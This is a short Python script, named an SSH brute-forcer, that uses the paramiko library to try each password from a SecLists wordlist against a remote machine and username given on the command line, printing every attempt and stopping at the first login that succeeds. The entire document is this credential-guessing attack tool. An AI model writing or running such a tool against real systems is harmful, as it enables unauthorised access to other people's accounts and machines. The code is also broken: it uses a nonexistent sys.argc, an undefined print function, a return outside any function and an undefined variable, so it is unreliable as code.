import paramiko
import sys

if(sys.argc < 2):
    print_to_stderr("Usage: sshBruteForcer.py <remote_machine> <username>")
    return

REMOTE_MACHINE = sys.argv[1]
username = sys.argv[2]
password = " "
counter = 0

client = paramiko.client.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open("/usr/share/wordlists/SecLists/common.txt") as wordlist:
    for line in wordlist:
        password = p.strip()
        try:
                client.connect(REMOTE_MACHINE, username=username, password=password)
                print(str(counter), "[+] Connected -", username, password )
                break
        except:
                counter += 1
                print(str(counter), "[-]", username, password)        
                client.close()
